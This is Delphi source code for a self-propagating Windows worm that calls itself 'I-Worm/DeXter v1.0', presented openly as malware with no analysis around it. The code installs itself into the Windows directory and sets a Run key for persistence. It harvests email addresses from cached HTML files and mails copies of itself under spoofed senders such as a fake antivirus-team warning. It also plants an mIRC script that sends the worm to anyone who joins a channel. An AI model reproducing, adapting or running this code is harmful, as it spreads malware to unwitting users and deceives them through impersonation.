   unit Unit1;

   interface

   uses
     Windows, Messages, Classes, SysUtils, Forms, Dialogs,
     Psock, NMsmtp, StdCtrls, ExtCtrls, registry, Controls;

   type
     TForm1 = class(TForm)
       NMSMTP1: TNMSMTP;
       Timer1: TTimer;
       Label1: TLabel;
       Label2: TLabel;
       procedure NMSMTP1Connect(Sender: TObject);
       procedure NMSMTP1Success(Sender: TObject);
       procedure NMSMTP1ConnectionFailed(Sender: TObject);
       procedure NMSMTP1InvalidHost(var Handled: Boolean);
       procedure Timer1Timer(Sender: TObject);
       procedure sendvir;
       procedure srcmail(p:string);
       function searchs(s:string): string;
       procedure FormCreate(Sender: TObject);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

   var
     Form1: TForm1;
     Reg: TRegistry;
     pth,s,pth2,win:string;
     f:text;
     toaddr:array[0..10] of string;
     i,mails,j,m:byte;
   implementation

   {$R *.DFM}

   function TForm1.searchs(s:string): string; //this searches for addresses in html files
   var i,j,k,l:integer;
       server,nomore,n:byte;
       name,serv:string;
   begin
   nomore:=0;
   server:=0;
   n:=0;
   k:=0;
   name:='';
   serv:='';
   searchs:='';
   for i:=1 to length(s) do
   begin
   if (i>3)and(UpCase(s[i])=':')and(UpCase(s[i-3])='L')and(UpCase(s[i-2])='T')and(UpCase(s[i-1])='O') then n:=n+1;
   if n=1 then
    begin
     for j:=i+1 to length(s) do
       begin
       inc(k);
       if (s[j]='@')and(nomore=0) then
         begin
         for l:=k-1 downto 1 do name:=name+s[j-l];
         inc(server);
         n:=0;
         end;
       if (server>0)and(nomore=0)and(s[j]<>'?')and(s[j]<>'"')and(s[j]<>'>')and(s[j]<>' ')and(s[j]<>':') then
       begin
       serv:=serv+s[j];
       end
       else if server>0 then nomore:=1;
       //for2
       end;
   searchs:=name+serv;
   end;
   //for1
   end;

   end;

   procedure TForm1.srcmail(p:string);
   var content:String;
       src:TSearchRec;
       fl:textfile;
   begin
   if FindFirst(p+'*.htm*',(faDirectory+faHidden+faAnyFile),src)=0 then
   begin
   assignfile(fl,p+src.name);
   reset(fl);
   while not eof(fl) do
   begin
   readln(fl,content);
   if searchs(content)<>'' then
    begin
    inc(m);
    toaddr[m]:=searchs(content);
    end;
   end;
   closefile(fl);
   while findnext(src)=0 do
   begin
   assignfile(fl,p+src.name);
   reset(fl);
   while not eof(fl) do
   begin
   readln(fl,content);
   if searchs(content)<>'' then
    begin
    inc(m);
    toaddr[m]:=searchs(content);
    end;
   end;
   closefile(fl);
   end;
   end;


   end;

   procedure TForm1.sendvir;
   const msg:array[1..4] of string = ('There is a new virus in "The Wild" called "W32/Dexter".Spreads through e-mail and IRC.A solution is this free program.Send this message to your friends. Thank you, AVP Team','hya, chaeck this cool freeware!','Something I coded.It''s cool!','A nice FX-screensaver.Better than the "Matrix" one!');
   const subj:array[1..4] of string = ('AVP-Virus-Warning','freeware nice game','My cool, litle program','Special FX screensaver');
   const from:array[1..4] of string = ('AVP-Team','Crazy Games inc. -New game company','Your best friend','FX-Demo coder');
   const fromaddr:array[1..4] of string = ('AVP.AutoMailer@avp.com','Crazygames@crazy.com','jonny@yahoo.com','FXdemos@opengl.org');
   begin
   {e-mail spread}
   Randomize;
   j:=random(4)+1; //random things
     NMSMTP1.PostMessage.FromAddress := fromaddr[j];
     NMSMTP1.PostMessage.FromName := from[j];
     NMSMTP1.PostMessage.ToAddress.Text := toaddr[random(m)+1];
     NMSMTP1.PostMessage.Body.Text :=msg[j];
     NMSMTP1.PostMessage.Attachments.Text := pth2;
     NMSMTP1.PostMessage.Subject := subj[j];
     NMSMTP1.SendMail;
   end;

   procedure TForm1.NMSMTP1Connect(Sender: TObject);
   begin
   {find some e-mail addresses}
   srcmail(win+'\Temp\');
   srcmail(win+'\');
   srcmail(win+'\Temporary Internet Files\');
   {send 1st infected e-mail}
   mails:=0;
   if m>0 then sendvir else form1.close; //only if an e-mail addr. is found
   end;

   procedure TForm1.NMSMTP1Success(Sender: TObject);
   begin
   {if the 1st was successfully sent, send others, but not more than 3}
   inc(mails);
   if mails<3 then sendvir else
   begin
   NMSMTP1.Disconnect;
   form1.close;
   end
   end;

   procedure TForm1.NMSMTP1ConnectionFailed(Sender: TObject);
   begin
   form1.close;
   end;

   procedure TForm1.NMSMTP1InvalidHost(var Handled: Boolean);
   begin
   form1.close;
   end;

   procedure TForm1.Timer1Timer(Sender: TObject);
   begin
   inc(i);
   if i>100 then i:=2;
   if i=1 then
   begin
   Form1.WindowState:=wsMinimized;
   {e-mail connection}
     NMSMTP1.Host :='mail.terrasat.ro'; //stupid mail server
     NMSMTP1.Port := 25; //default port
     NMSMTP1.UserID := 'john'; //I dunno who this guy is :]
     NMSMTP1.SubType := mtHtml;
     NMSMTP1.EncodeType := uuMime;
     NMSMTP1.Connect;
   end;
   end;

   procedure TForm1.FormCreate(Sender: TObject);
   var M,Y,D:word;
   begin
   {find the WinDir}
   Reg := TRegistry.Create;
   Reg.RootKey:= HKEY_LOCAL_MACHINE;
   if Reg.OpenKey('\SOFTWARE\Microsoft\Windows\CurrentVersion',false) then
   begin
   win:=Reg.ReadString('SystemRoot');
   end;
   Reg.CloseKey;
   {if it isn't the first run-time, then send the file as setup.exe}
   pth2:=win+'\setup.exe';
   {is the computer already infected?}
   Reg.RootKey := HKEY_CURRENT_USER;
   if Reg.OpenKey('\Software\Microsoft\Windows\', True)
   then if Reg.ReadString('Dexter')<>'deXter' then
   begin
   {if not, let's do it!}
   {first, mark the Registry}
   Reg.WriteString('Dexter', 'deXter');
   Reg.CloseKey;
   {copy the Worm in the WinDir with a random name}
   Randomize;
   j:=random(10);
   s:=win+'\sys'+IntToStr(j)+'.exe';
   copyfile(PChar(Paramstr(0)),PChar(s),false);
   copyfile(PChar(Paramstr(0)),PChar(win+'\setup.exe'),false);
   {make it run every time Windowze starts}
   Reg.RootKey := HKEY_CURRENT_USER;
   Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', True);
   Reg.WriteString('DX',s);
   Reg.CloseKey;
   {get the WinZip dir. and zip the virus so it can be send over mIRC}
   Reg.RootKey:= HKEY_LOCAL_MACHINE;
   if Reg.OpenKey('\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\winzip32.exe',false) then
   begin
   pth:=Reg.ReadString('');
   j:=random(10);
   Reg.CloseKey;
   pth2:=win+'\os'+IntToStr(j)+'.zip';
   Reg.RootKey := HKEY_CURRENT_USER;
   Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\RunOnce', True);
   Reg.WriteString('DX',pth+' -a -r '+pth2+' '+s);
   Reg.CloseKey;
   end
   else
   begin
   Reg.RootKey:= HKEY_LOCAL_MACHINE;
   if Reg.OpenKey('\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\winzip.exe',false) then
   begin
   pth:=Reg.ReadString('');
   j:=random(10);
   Reg.CloseKey;
   pth2:=win+'\os'+IntToStr(j)+'.zip';
   Reg.RootKey := HKEY_CURRENT_USER;
   Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\RunOnce', True);
   Reg.WriteString('DX',pth+' -a -r '+pth2+' '+s);
   Reg.CloseKey;
   end
   else pth2:=s;
   end;
   {mIRC directory detection, unique one!Write a script there}
   if Reg.OpenKey('\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\mIRC',false) then
   begin
   toaddr[0]:=s;
   s:='';
   pth:=Reg.ReadString('UninstallString');
   for j:=1 to length(pth) do if (j>1)and(j<length(pth)-21) then s:=s+pth[j];
   assignfile(f,s+'script.ini');
   rewrite(f);
   writeln(f,'[Script]');
   writeln(f,'n0=ON 1:JOIN:#:{');
   writeln(f,'n1=/dcc send $nick ',pth2);
   writeln(f,'n2=}');
   writeln(f,'n3=on 1:start:{');
   writeln(f,'n4= /run -n ',toaddr[0]);
   writeln(f,'n5=}');
   closefile(f);
   end;

   end;
   Reg.CloseKey;
   Reg.Free;
   {payload}
   DecodeDate(Now,Y,M,D);
   if (M=12)and((D=24)or(D=25)) then
   begin
   MessageDlg('DeXter wishes you a Merry Christmas!'+Chr(13)+chr(10)+' Not to worry, no harm done (only my stupid sister does that) :D', mtInformation,[mbOk], 0);
   Form1.Visible:=true; //Show the label :P
   Form1.Caption:='I-Worm/DeXter v1.0'; //v1.0
   label1.visible:=true;
   end;
   end;

   end.
